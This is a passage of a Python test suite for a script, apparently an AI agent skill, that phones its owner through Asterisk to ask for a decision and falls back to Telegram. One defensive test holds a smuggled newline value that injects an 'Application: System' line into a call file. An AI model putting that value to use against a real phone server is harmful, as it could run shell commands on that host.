import importlib.util
import io
import json
import os
import socket
import tempfile
import threading
import unittest
import wave
from datetime import datetime
from pathlib import Path

SCRIPT = Path(__file__).resolve().parent.parent / ".claude/skills/ceo-call/scripts/ceo_call.py"
spec = importlib.util.spec_from_file_location("ceo_call", SCRIPT)
ceo = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ceo)
ceo.DEFAULT_CONFIG["state_file"] = None  # tests must never touch the real throttle file


def fake_synth(host, port, text):
    return (22050, 2, 1, b"\x10\x00" * 2205)  # 0.1 s of a constant tone


class FakeClock:
    """Time only moves when the code sleeps, so the polling loop runs for real and instantly."""

    def __init__(self):
        self.now = 0.0

    def __call__(self):
        return self.now

    def sleep(self, seconds):
        self.now += seconds


class FakeAsterisk:
    """Simulates the call folder. Each script entry says what one originated call leaves behind:
    a plain string is the result written at once ("unanswered" and "hangup" are special), a dict
    maps a read count (reads of the call folder after the call started) to the markers that appear."""

    def __init__(self, script):
        self.files = {}
        self.script = list(script)
        self.dirs = set()
        self.originated = 0
        self.swept = 0
        self.registered = True
        self.timeline = {}
        self.reads = 0

    def sweep_stale(self):
        self.swept += 1

    def endpoint_available(self, endpoint):
        value = self.registered
        return value() if callable(value) else value

    def make_dir(self, path):
        self.dirs.add(path)

    def write_file(self, path, data):
        self.files[path] = data

    def read_file(self, path):
        self.reads += 1
        base = next(iter(self.dirs)) if self.dirs else ""
        for when in [w for w in self.timeline if w <= self.reads]:
            for name, value in self.timeline.pop(when).items():
                self.files[base + "/" + name] = value
        value = self.files.get(path)
        return value.decode() if isinstance(value, bytes) else value

    def remove(self, *paths):
        for path in paths:
            for key in [k for k in self.files if k == path or k.startswith(path + "/")]:
                del self.files[key]
            self.dirs.discard(path)

    def originate(self, name, call_file):
        self.originated += 1
        base = next(iter(self.dirs))
        outcome = self.script.pop(0)
        self.reads = 0
        if isinstance(outcome, dict):
            self.timeline = dict(outcome)
            return
        if outcome == "unanswered":
            return
        self.files[base + "/answered"] = "1"
        if outcome != "hangup":
            self.files[base + "/result"] = outcome
        self.files[base + "/done"] = "1"


def run_ask(script, request=None, env=None, notifier=None, config=None, clock_time=(12, 0)):
    cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, poll_interval_s=2, ring_timeout_s=30, call_timeout_s=300, attempts=3)
    cfg.update(config or {})
    clock = FakeClock()
    asterisk = FakeAsterisk(script)
    sent = []

    def default_notifier(token, chat, text, silent=False):
        sent.append((token, chat, text, silent))
        return True

    request = request or {"question": "Ship it?", "options": ["Yes", "No", "Later"]}
    result = ceo.ask(
        request, cfg, env if env is not None else {}, asterisk,
        synth=fake_synth, notifier=notifier or default_notifier,
        sleep=clock.sleep, clock=clock,
        now=lambda: datetime(2026, 1, 1, *clock_time),
    )
    run_ask.clock = clock
    return result, asterisk, sent


class ValidateRequestTests(unittest.TestCase):
    def test_a_lone_surrogate_is_refused_before_any_call(self):
        for request in ({"question": "q\ud83d", "options": ["a", "b"]}, {"question": "q", "options": ["a\ud83d", "b"]}):
            with self.subTest(request=request):
                with self.assertRaises(ceo.CallError):
                    ceo.validate_request(request)

    def test_accepts_a_normal_request(self):
        clean = ceo.validate_request({"question": " Ship? ", "options": ["a", " b "]})
        self.assertEqual(clean, {"question": "Ship?", "options": ["a", "b"]})

    def test_rejects_bad_requests(self):
        bad = [
            None, [], {}, {"question": "", "options": ["a", "b"]},
            {"question": "q", "options": ["only one"]},
            {"question": "q", "options": [str(i) for i in range(9)]},
            {"question": "q", "options": ["a", ""]},
            {"question": "q", "options": ["a", 3]},
            {"question": "x" * 801, "options": ["a", "b"]},
            {"question": "q", "options": ["a", "b" * 201]},
            {"question": "q\x00", "options": ["a", "b"]},
            {"question": "q", "options": ["a", "b\nc"]},
        ]
        for request in bad:
            with self.subTest(request=request):
                with self.assertRaises(ceo.CallError):
                    ceo.validate_request(request)


class PromptTests(unittest.TestCase):
    def test_each_option_has_a_readback_prompt_naming_it(self):
        prompts = ceo.build_prompts("Ship it?", ["Yes", "No"])
        self.assertTrue(prompts["prompt"].startswith("Hola, soy Claudio."))
        self.assertIn("Opción 1: Yes", prompts["prompt"])
        self.assertIn("Opción 2: No", prompts["prompt"])
        self.assertIn("opción 2: No", prompts["confirm_2"])
        self.assertIn("confirm_1", prompts)
        self.assertNotIn("confirm_3", prompts)
        self.assertIn("thanks", prompts)
        self.assertIn("giveup", prompts)


class AudioTests(unittest.TestCase):
    def test_wav_is_mono_8k_because_asterisk_opens_no_other_wav_rate(self):
        wav = ceo.to_wav(22050, 2, 1, b"\x10\x00" * 22050)  # one second
        with wave.open(io.BytesIO(wav)) as handle:
            self.assertEqual((handle.getnchannels(), handle.getsampwidth(), handle.getframerate()), (1, 2, 8000))
            self.assertAlmostEqual(handle.getnframes(), 8000 + 2000, delta=5)  # 1 s + 0.25 s silence

    def test_downsampling_keeps_a_steady_level_and_averages_out_fast_noise(self):
        import array
        steady = ceo.resample(array.array("h", [1000] * 2205), 22050, 8000)
        self.assertTrue(all(v == 1000 for v in steady))
        noisy = ceo.resample(array.array("h", [3000, -3000] * 2205), 22050, 8000)
        self.assertLess(max(abs(v) for v in noisy), 1500)

    def test_stereo_is_mixed_down_to_mono(self):
        left, right = (100).to_bytes(2, "little", signed=True), (300).to_bytes(2, "little", signed=True)
        wav = ceo.to_wav(16000, 2, 2, (left + right) * 1600)
        with wave.open(io.BytesIO(wav)) as handle:
            self.assertEqual(handle.getnchannels(), 1)
            self.assertAlmostEqual(handle.getnframes(), 800 + 2000, delta=5)
            first = int.from_bytes(handle.readframes(1), "little", signed=True)
        self.assertEqual(first, 200)

    def test_rejects_non_16_bit_audio(self):
        with self.assertRaises(ceo.CallError):
            ceo.to_wav(22050, 1, 1, b"\x00" * 100)


class WyomingServer:
    def __init__(self, events):
        self.events = events
        self.listener = socket.socket()
        self.listener.bind(("127.0.0.1", 0))
        self.listener.listen(1)
        self.port = self.listener.getsockname()[1]
        self.received = None
        threading.Thread(target=self.serve, daemon=True).start()

    def serve(self):
        conn, _ = self.listener.accept()
        handle = conn.makefile("rwb")
        self.received = json.loads(handle.readline())
        for header, payload in self.events:
            header = dict(header)
            if payload:
                header["payload_length"] = len(payload)
            handle.write((json.dumps(header) + "\n").encode() + payload)
            handle.flush()
        threading.Event().wait(0.5)  # the real server keeps the connection open after audio-stop
        conn.close()
        self.listener.close()


class SynthesizeTests(unittest.TestCase):
    def test_reads_audio_until_audio_stop(self):
        server = WyomingServer([
            ({"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 1}}, b""),
            ({"type": "audio-chunk", "data": {"rate": 22050, "width": 2, "channels": 1}}, b"\x01\x00\x02\x00"),
            ({"type": "audio-chunk", "data": {"rate": 22050, "width": 2, "channels": 1}}, b"\x03\x00"),
            ({"type": "audio-stop"}, b""),
        ])
        rate, width, channels, pcm = ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
        self.assertEqual((rate, width, channels), (22050, 2, 1))
        self.assertEqual(pcm, b"\x01\x00\x02\x00\x03\x00")
        self.assertEqual(server.received["data"]["text"], "hola")

    def test_error_event_and_early_close_fail_cleanly(self):
        server = WyomingServer([({"type": "error", "data": {"text": "boom"}}, b"")])
        with self.assertRaises(ceo.CallError):
            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
        server = WyomingServer([({"type": "audio-start", "data": {"rate": 1, "width": 2, "channels": 1}}, b"")])
        with self.assertRaises(ceo.CallError):
            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)

    def test_a_slowly_trickled_payload_cannot_outlast_the_overall_deadline(self):
        import time as _t
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)

        def serve():
            conn, _ = listener.accept()
            conn.makefile("rwb").readline()
            try:
                conn.sendall(b'{"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 1}}\n')
                conn.sendall(b'{"type": "audio-chunk", "payload_length": 1000}\n')
                for _ in range(40):
                    conn.sendall(b"x")
                    _t.sleep(0.3)
            except OSError:
                pass
            conn.close()

        threading.Thread(target=serve, daemon=True).start()
        started = _t.monotonic()
        with self.assertRaises(ceo.CallError):
            ceo.synthesize("127.0.0.1", listener.getsockname()[1], "hola", timeout=1)
        self.assertLess(_t.monotonic() - started, 4)
        listener.close()

    def test_a_header_line_without_a_newline_is_capped(self):
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)

        def serve():
            conn, _ = listener.accept()
            conn.makefile("rwb").readline()
            try:
                conn.sendall(b"x" * (ceo.MAX_HEADER_BYTES + 100))
                threading.Event().wait(1)
            except OSError:
                pass
            conn.close()

        threading.Thread(target=serve, daemon=True).start()
        with self.assertRaises(ceo.CallError):
            ceo.synthesize("127.0.0.1", listener.getsockname()[1], "hola", timeout=5)
        listener.close()

    def test_malformed_messages_fail_cleanly_instead_of_raising(self):
        bad_starts = [
            {"type": "audio-start", "data": {"rate": None, "width": 2, "channels": 1}},
            {"type": "audio-start", "data": [1, 2]},
            {"type": "audio-start", "data": "text"},
            {"type": "audio-start", "data": {"rate": [1], "width": 2, "channels": 1}},
        ]
        for header in bad_starts:
            with self.subTest(header=header):
                server = WyomingServer([(header, b""), ({"type": "audio-stop"}, b"")])
                with self.assertRaises(ceo.CallError):
                    ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)

    def test_a_zero_rate_or_negative_length_fails_cleanly(self):
        for header in (
            {"type": "audio-start", "data": {"rate": 0, "width": 2, "channels": 1}},
            {"type": "audio-start", "data": {"rate": 22050, "width": 0, "channels": 1}},
            {"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 0}},
            {"type": "audio-start", "data": {"rate": -5, "width": 2, "channels": 1}},
        ):
            with self.subTest(header=header):
                server = WyomingServer([(header, b""), ({"type": "audio-chunk", "data": {}}, b"\x01\x00"), ({"type": "audio-stop"}, b"")])
                with self.assertRaises(ceo.CallError):
                    ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
        server = WyomingServer([({"type": "audio-chunk", "data": {}, "payload_length": -1}, b"")])
        with self.assertRaises(ceo.CallError):
            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)

    def test_a_truncated_message_is_an_error_not_silent_short_audio(self):
        server = WyomingServer([({"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 1}}, b""),
                                ({"type": "audio-chunk", "data": {}, "payload_length": 10}, b"\x01\x00")])
        with self.assertRaises(ceo.CallError):
            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)

    def test_resample_rejects_a_zero_source_rate(self):
        with self.assertRaises(ceo.CallError):
            ceo.resample([1, 2, 3], 0, 8000)

    def test_unreachable_server_fails_cleanly(self):
        with self.assertRaises(ceo.CallError):
            ceo.synthesize("127.0.0.1", 1, "hola", timeout=1)


class CallFileTests(unittest.TestCase):
    def test_call_file_carries_only_ids_and_counts(self):
        text = ceo.build_call_file("PJSIP/phone", "ab" * 8, 3, 30)
        self.assertIn("Channel: PJSIP/phone", text)
        self.assertIn("Setvar: CEO_ID=" + "ab" * 8, text)
        self.assertIn("Setvar: CEO_OPTIONS=3", text)
        self.assertIn("MaxRetries: 0", text)

    def test_rejects_injection_in_parameters(self):
        for endpoint, call_id in [("PJSIP/phone\nApplication: System", "ab" * 8), ("PJSIP/phone", "ab\nx"), ("SIP/x", "ab" * 8)]:
            with self.subTest(endpoint=endpoint, call_id=call_id):
                with self.assertRaises(ceo.CallError):
                    ceo.build_call_file(endpoint, call_id, 2, 30)


class ConfigTests(unittest.TestCase):
    def write(self, content):
        handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
        handle.write(content)
        handle.close()
        self.addCleanup(os.unlink, handle.name)
        return handle.name

    def test_defaults_without_a_file(self):
        self.assertEqual(ceo.load_config(None)["endpoint"], "PJSIP/phone")

    def test_call_windows_that_could_overlap_a_live_call_are_refused(self):
        for content in ['{"ring_timeout_s": 0}', '{"ring_timeout_s": 4}', '{"call_timeout_s": 30}', '{"piper_host": 5}', '{"env_file": ""}']:
            with self.subTest(content=content):
                with self.assertRaises(ceo.CallError):
                    ceo.load_config(self.write(content))

    def test_rejects_unknown_keys_and_bad_values(self):
        for content in ['{"nope": 1}', '{"endpoint": "SIP/x"}', '{"attempts": 0}', '{"attempts": "3"}', '{"container": "a b"}', "[]", "not json"]:
            with self.subTest(content=content):
                with self.assertRaises(ceo.CallError):
                    ceo.load_config(self.write(content))


class EnvFileTests(unittest.TestCase):
    def make(self, mode):
        handle = tempfile.NamedTemporaryFile("w", delete=False)
        handle.write("# comment\nCEO_TELEGRAM_TOKEN=abc\nCEO_TELEGRAM_CHAT_ID='42'\n")
        handle.close()
        os.chmod(handle.name, mode)
        self.addCleanup(os.unlink, handle.name)
        return handle.name

    def test_private_file_is_read(self):
        self.assertEqual(ceo.load_env_file(self.make(0o600)), {"CEO_TELEGRAM_TOKEN": "abc", "CEO_TELEGRAM_CHAT_ID": "42"})

    def test_group_or_world_readable_file_is_refused(self):
        for mode in (0o640, 0o644, 0o604):
            with self.subTest(mode=oct(mode)):
                with self.assertRaises(ceo.CallError):
                    ceo.load_env_file(self.make(mode))

    def test_unreadable_env_path_is_a_clean_error(self):
        folder = tempfile.mkdtemp()
        os.chmod(folder, 0o700)
        self.addCleanup(os.rmdir, folder)
        with self.assertRaises(ceo.CallError):
            ceo.load_env_file(folder)

    def test_missing_file_means_nothing_configured(self):
        self.assertEqual(ceo.load_env_file("/nonexistent/ceo-env"), {})


class TelegramTests(unittest.TestCase):
    def test_posts_to_the_bot_api_and_reports_success(self):
        seen = {}

        class Response(io.BytesIO):
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        def opener(request, timeout):
            seen["url"], seen["body"] = request.full_url, request.data.decode()
            return Response(b'{"ok": true}')

        self.assertTrue(ceo.send_telegram("TOKEN", "42", "hello world", opener=opener))
        self.assertEqual(seen["url"], "https://api.telegram.org/botTOKEN/sendMessage")
        self.assertIn("chat_id=42", seen["body"])
        self.assertIn("hello+world", seen["body"])

    def test_any_failure_returns_false_without_raising(self):
        def opener(request, timeout):
            raise OSError("https://api.telegram.org/botTOKEN/sendMessage failed")

        self.assertFalse(ceo.send_telegram("TOKEN", "42", "x", opener=opener))


class AskFlowTests(unittest.TestCase):
    def test_confirmed_choice_is_returned_with_its_option_text(self):
        result, asterisk, sent = run_ask(["2"])
        self.assertEqual(result["status"], "decided")
        self.assertEqual((result["choice"], result["option"], result["attempt"]), (2, "No", 1))
        self.assertIs(result["notified"], False)
        self.assertEqual(sent, [])

    def test_everything_is_removed_after_the_call_and_old_folders_are_swept_first(self):
        result, asterisk, _ = run_ask(["1"])
        self.assertEqual(asterisk.files, {})
        self.assertEqual(asterisk.dirs, set())
        self.assertEqual(asterisk.swept, 1)

    def test_prompts_exist_while_the_call_runs(self):
        seen = []
        original = FakeAsterisk.originate

        def spy(self, name, call_file):
            seen.extend(sorted(k.rsplit("/", 1)[1] for k in self.files))
            original(self, name, call_file)

        FakeAsterisk.originate = spy
        try:
            run_ask(["1"])
        finally:
            FakeAsterisk.originate = original
        self.assertEqual(seen, ["confirm_1.wav", "confirm_2.wav", "confirm_3.wav", "giveup.wav", "prompt.wav", "thanks.wav"])

    def test_a_confirmation_that_lands_just_after_the_deadline_is_not_lost(self):
        # The call is live (answered) when call_timeout_s expires; the owner confirms during the grace wait.
        result, asterisk, _ = run_ask([{1: {"answered": "1"}, 100: {"result": "2", "done": "1"}}], config={"call_timeout_s": 60, "attempts": 1})
        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
        self.assertEqual(asterisk.originated, 1)

    def test_a_call_still_live_long_after_the_deadline_is_a_hangup_not_a_redial_during_the_call(self):
        result, asterisk, _ = run_ask([{1: {"answered": "1"}, 100000: {"done": "1"}}] * 3, config={"call_timeout_s": 60, "attempts": 1})
        self.assertEqual(result["status"], "hangup")

    def test_an_infrastructure_error_after_the_start_still_messages_the_owner_then_raises(self):
        class Flaky(FakeAsterisk):
            def originate(self, name, call_file):
                raise ceo.CallError("cannot run docker")

        sent = []
        with self.assertRaises(ceo.CallError):
            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
                    Flaky([]), synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
                    sleep=FakeClock().sleep, clock=FakeClock(), now=lambda: datetime(2026, 1, 1, 12, 0))
        self.assertEqual(len(sent), 1)
        self.assertIn("Decisión pendiente", sent[0])

    def test_a_result_file_that_is_still_being_written_is_not_an_error(self):
        # Asterisk's FILE() truncates before it writes: a poll can see an empty result.
        result, _, _ = run_ask([{1: {"answered": "1"}, 3: {"result": ""}, 6: {"result": "2", "done": "1"}}], config={"attempts": 1})
        self.assertEqual((result["status"], result["choice"]), ("decided", 2))

    def test_a_burst_of_asks_is_capped_per_hour(self):
        import time as _t
        state = Path(tempfile.mkdtemp()) / "last_ask"
        now = _t.time()
        state.write_text("".join("%d\n" % (now - 600 - 60 * i) for i in range(6)))
        self.addCleanup(lambda: state.exists() and state.unlink())
        with self.assertRaises(ceo.CallError) as caught:
            run_ask(["1"], config={"state_file": str(state), "min_gap_s": 120, "max_per_hour": 6})
        self.assertIn("too many", str(caught.exception))
        result, _, _ = run_ask(["1"], config={"state_file": str(state), "min_gap_s": 120, "max_per_hour": 7})
        self.assertEqual(result["status"], "decided")

    def test_a_call_still_live_after_the_grace_is_not_followed_by_a_second_call(self):
        result, asterisk, _ = run_ask([{1: {"answered": "1"}}, "1", "1"], config={"call_timeout_s": 60})
        self.assertEqual(result["status"], "hangup")
        self.assertEqual(asterisk.originated, 1)

    def test_quiet_hours_are_checked_again_after_the_heads_up_wait(self):
        times = iter([(22, 59), (23, 1), (23, 1)])
        reads = iter([False, False, True])
        asterisk = FakeAsterisk(["1"])
        asterisk.registered = lambda: next(reads, True)
        cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, poll_interval_s=2, ring_timeout_s=30, call_timeout_s=300,
                   attempts=1, quiet_start="23:00", quiet_end="08:00", heads_up_s=90)
        clock = FakeClock()
        result = ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
                         asterisk, synth=fake_synth, notifier=lambda *a, **k: True, sleep=clock.sleep, clock=clock,
                         now=lambda: datetime(2026, 1, 1, *next(times)))
        self.assertEqual(result["status"], "deferred")
        self.assertEqual(asterisk.originated, 0)

    def test_the_message_for_an_unregistered_phone_does_not_claim_it_rang(self):
        text = ceo.notification_text("q", ["a", "b"], "phone_not_registered")
        self.assertNotIn("No contestaste", text)
        self.assertIn("teléfono", text)

    def test_parallel_asks_cannot_slip_past_the_throttle(self):
        state = Path(tempfile.mkdtemp()) / "last_ask"
        self.addCleanup(lambda: state.exists() and state.unlink())
        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120, max_per_hour=6)
        results = []
        barrier = threading.Barrier(8)

        def attempt():
            barrier.wait()
            try:
                ceo.check_throttle(cfg, wall=lambda: 1000.0)
                results.append("ok")
            except ceo.CallError:
                results.append("refused")

        threads = [threading.Thread(target=attempt) for _ in range(8)]
        [t.start() for t in threads]
        [t.join() for t in threads]
        self.assertEqual(results.count("ok"), 1)

    def test_an_ask_that_never_placed_a_call_does_not_count_against_the_throttle(self):
        state = Path(tempfile.mkdtemp()) / "last_ask"
        self.addCleanup(lambda: state.exists() and state.unlink())
        cfg = {"state_file": str(state), "min_gap_s": 120, "max_per_hour": 6}

        def failing_synth(host, port, text):
            raise ceo.CallError("cannot get speech from the speech server")

        asterisk = FakeAsterisk([])
        with self.assertRaises(ceo.CallError):
            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, **cfg), {}, asterisk, synth=failing_synth,
                    sleep=FakeClock().sleep, clock=FakeClock(), now=lambda: datetime(2026, 1, 1, 12, 0))
        self.assertEqual(state.read_text().strip(), "")
        result, _, _ = run_ask(["1"], config=cfg)  # the next real ask is not blocked
        self.assertEqual(result["status"], "decided")

    def test_a_failure_while_the_call_may_be_live_leaves_the_folder_for_the_dialplan(self):
        class Flaky(FakeAsterisk):
            def read_file(self, path):
                raise ceo.DockerError("cannot read call state from the Asterisk container")

        asterisk = Flaky(["1"])
        clock = FakeClock()
        with self.assertRaises(ceo.CallError):
            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk, synth=fake_synth,
                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
        self.assertEqual(asterisk.originated, 1)
        self.assertTrue(asterisk.dirs)  # not removed: the owner may be mid-confirmation; the daily sweep cleans it

    def test_a_failure_before_the_call_removes_the_folder(self):
        def failing_synth(host, port, text):
            raise ceo.CallError("cannot get speech from the speech server")

        asterisk = FakeAsterisk([])
        with self.assertRaises(ceo.CallError):
            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk, synth=failing_synth,
                    sleep=FakeClock().sleep, clock=FakeClock(), now=lambda: datetime(2026, 1, 1, 12, 0))
        self.assertEqual(asterisk.dirs, set())

    def test_a_cleanup_failure_does_not_hide_the_real_error_or_keep_the_throttle_slot(self):
        state = Path(tempfile.mkdtemp()) / "last_ask"
        self.addCleanup(lambda: state.exists() and state.unlink())

        def failing_synth(host, port, text):
            raise ceo.CallError("cannot get speech from the speech server")

        class CleanupFails(FakeAsterisk):
            def remove(self, *paths):
                raise ceo.DockerError("cannot run docker")

        with self.assertRaises(ceo.CallError) as caught:
            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120),
                    {}, CleanupFails([]), synth=failing_synth, sleep=FakeClock().sleep, clock=FakeClock(),
                    now=lambda: datetime(2026, 1, 1, 12, 0))
        self.assertIn("speech", str(caught.exception))
        self.assertEqual(state.read_text().strip(), "")

    def test_a_docker_failure_after_the_digit_was_read_does_not_lose_the_decision(self):
        class DoneFails(FakeAsterisk):
            def read_file(self, path):
                if path.endswith("/done") and self.files.get(path.rsplit("/", 1)[0] + "/result") is not None:
                    raise ceo.DockerError("cannot read call state from the Asterisk container")
                return super().read_file(path)

        asterisk = DoneFails([{1: {"answered": "1"}, 3: {"result": "2"}}])
        clock = FakeClock()
        result = ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, attempts=1), {}, asterisk,
                         synth=fake_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
        self.assertEqual((result["status"], result["choice"]), ("decided", 2))

    def test_two_asks_in_the_same_second_keep_their_own_slots(self):
        state = Path(tempfile.mkdtemp()) / "last_ask"
        self.addCleanup(lambda: state.exists() and state.unlink())
        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=0, max_per_hour=6)
        first = ceo.check_throttle(cfg, wall=lambda: 1000.2)
        second = ceo.check_throttle(cfg, wall=lambda: 1000.7)
        ceo.release_throttle(cfg, second)
        remaining = [float(x) for x in state.read_text().split()]
        self.assertEqual(remaining, [first])

    def test_a_clock_that_steps_back_does_not_reset_the_hourly_limit(self):
        state = Path(tempfile.mkdtemp()) / "last_ask"
        self.addCleanup(lambda: state.exists() and state.unlink())
        state.write_text("".join("%d\n" % (10000 + i) for i in range(6)))
        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=0, max_per_hour=6)
        with self.assertRaises(ceo.CallError):
            ceo.check_throttle(cfg, wall=lambda: 9000.0)  # the clock is now before the recorded starts

    def test_sigterm_mid_call_messages_the_owner_and_leaves_the_folder(self):
        import signal as _signal

        class Terminated(FakeAsterisk):
            def read_file(self, path):
                if not getattr(self, "killed", False):
                    self.killed = True
                    os.kill(os.getpid(), _signal.SIGTERM)
                return super().read_file(path)

        previous = _signal.getsignal(_signal.SIGTERM)
        self.addCleanup(_signal.signal, _signal.SIGTERM, previous)
        ceo.exit_cleanly_on_sigterm()
        sent = []
        asterisk = Terminated(["unanswered"])
        clock = FakeClock()
        with self.assertRaises(ceo.CallError):
            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
                    asterisk, synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
        self.assertEqual(len(sent), 1)  # the owner is told the decision is still pending
        self.assertTrue(asterisk.dirs)  # a live call keeps its folder

    def test_a_second_ask_too_soon_is_refused_before_any_call(self):
        state = Path(tempfile.mkdtemp()) / "last_ask"
        self.addCleanup(lambda: state.exists() and state.unlink())
        cfg = {"state_file": str(state), "min_gap_s": 120}
        result, asterisk, _ = run_ask(["1"], config=cfg)
        self.assertEqual(result["status"], "decided")
        self.assertTrue(state.exists())
        with self.assertRaises(ceo.CallError) as caught:
            run_ask(["1"], config=cfg)
        self.assertIn("too soon", str(caught.exception))

    def test_an_ask_after_the_gap_is_allowed_and_the_throttle_can_be_off(self):
        state = Path(tempfile.mkdtemp()) / "last_ask"
        state.write_text(str(__import__("time").time() - 500))
        self.addCleanup(lambda: state.exists() and state.unlink())
        result, _, _ = run_ask(["1"], config={"state_file": str(state), "min_gap_s": 120})
        self.assertEqual(result["status"], "decided")
        result, _, _ = run_ask(["1"], config={"state_file": str(state), "min_gap_s": 0})
        self.assertEqual(result["status"], "decided")

    def test_a_deferred_request_does_not_start_the_throttle(self):
        state = Path(tempfile.mkdtemp()) / "last_ask"
        run_ask([], config={"state_file": str(state), "min_gap_s": 120, "quiet_start": "23:00", "quiet_end": "08:00"}, clock_time=(3, 0))
        self.assertFalse(state.exists())

    def test_no_answer_retries_then_notifies_once(self):
        result, asterisk, sent = run_ask(["unanswered"] * 3, env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"})
        self.assertEqual(result["status"], "unanswered")
        self.assertEqual(asterisk.originated, 3)
        self.assertTrue(result["notified"])
        self.assertEqual(len(sent), 1)
        self.assertIn("Ship it?", sent[0][2])
        self.assertIn("1. Yes", sent[0][2])
        self.assertFalse(sent[0][3])

    def test_answer_on_a_later_attempt_is_accepted_without_notifying(self):
        result, asterisk, sent = run_ask(["unanswered", "unanswered", "3"], env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"})
        self.assertEqual((result["status"], result["choice"], result["attempt"]), ("decided", 3, 3))
        self.assertEqual(asterisk.originated, 3)
        self.assertEqual(sent, [])

    def test_hanging_up_before_confirming_is_not_a_decision(self):
        result, asterisk, sent = run_ask(["hangup"] * 3, env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"})
        self.assertEqual(result["status"], "hangup")
        self.assertEqual(asterisk.originated, 1)  # the owner picked up and chose to hang up: no re-ring
        self.assertEqual(len(sent), 1)

    def test_undecided_is_final_and_notifies(self):
        result, asterisk, sent = run_ask(["undecided"], env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"})
        self.assertEqual(result["status"], "undecided")
        self.assertEqual(asterisk.originated, 1)
        self.assertEqual(len(sent), 1)

    def test_a_result_outside_the_option_range_is_never_accepted(self):
        for bad in ["4", "0", "9", "x", "12", "1 2", "-1"]:
            with self.subTest(result=bad):
                with self.assertRaises(ceo.CallError):
                    run_ask([bad])

    def test_files_are_removed_even_when_the_call_errors(self):
        asterisk = FakeAsterisk(["7"])
        cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0)
        clock = FakeClock()
        with self.assertRaises(ceo.CallError):
            ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {}, asterisk, synth=fake_synth,
                    sleep=clock.sleep, clock=clock)
        self.assertEqual(asterisk.files, {})
        self.assertEqual(asterisk.dirs, set())

    def test_a_call_nobody_picks_up_gives_up_after_the_ring_window(self):
        run_ask(["unanswered"], config={"attempts": 1})
        self.assertGreaterEqual(run_ask.clock.now, 45)   # ring_timeout_s + 15
        self.assertLess(run_ask.clock.now, 50)

    def test_the_owner_takes_a_while_to_answer_and_to_choose(self):
        late = {3: {"answered": "1"}, 40: {"result": "2"}, 44: {"done": "1"}}
        result, asterisk, _ = run_ask([late])
        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
        self.assertEqual(asterisk.originated, 1)
        self.assertEqual(asterisk.files, {})

    def test_the_result_waits_for_the_thank_you_message_to_finish(self):
        late = {2: {"answered": "1", "result": "1"}, 6: {"done": "1"}}
        result, asterisk, _ = run_ask([late])
        self.assertEqual(result["status"], "decided")
        self.assertGreaterEqual(asterisk.reads, 6)

    def test_answering_then_never_finishing_ends_at_the_call_deadline_as_hangup(self):
        stuck = {2: {"answered": "1"}}
        result, _, _ = run_ask([stuck], config={"attempts": 1})
        self.assertEqual(result["status"], "hangup")
        self.assertGreaterEqual(run_ask.clock.now, 330)  # ring_timeout_s + call_timeout_s
        self.assertLess(run_ask.clock.now, 330 + 2 * ceo.GRACE_POLLS + 5)  # plus the short grace for a live call

    def test_an_answered_call_is_not_reported_as_unanswered_when_the_marker_is_seen_late(self):
        result, _, _ = run_ask([{40: {"answered": "1", "done": "1"}}], config={"attempts": 1})
        self.assertEqual(result["status"], "hangup")

    def test_without_chat_settings_nothing_is_sent_and_it_says_so(self):
        result, _, sent = run_ask(["unanswered"] * 3)
        self.assertFalse(result["notified"])
        self.assertEqual(sent, [])

    def test_invalid_request_places_no_call(self):
